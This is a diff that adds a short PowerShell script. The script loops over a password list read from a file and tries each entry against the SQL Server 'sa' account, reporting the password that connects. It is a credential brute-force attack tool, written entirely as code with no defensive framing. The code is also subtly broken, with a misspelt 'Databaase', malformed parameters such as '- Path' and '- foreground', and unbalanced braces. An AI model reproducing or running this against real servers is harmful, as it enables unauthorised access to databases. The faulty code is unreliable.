@@ -1,0 +1,17 @@
+$instance = sqlserver
+$passwords = Get-Content - Path "C:\filepath"
+
+foreach ($password in $passwords) {
+$password = $password.Trim()
+
+$connString = "Data Source=$($instance);Databaase=master;user ID = sa;Password=$($password)"
+$cn = New-Object System.Data.sqlClient.sqlConnection $connString
+
+Try{
+$cn.Open()
+Write-Host "Connected to $instance with password $password" -ForegroundColor Green
+break
+}
+catch{
+Write-Host "failed to connect to $instance with passwords $password"  - foreground Gray}}
+}
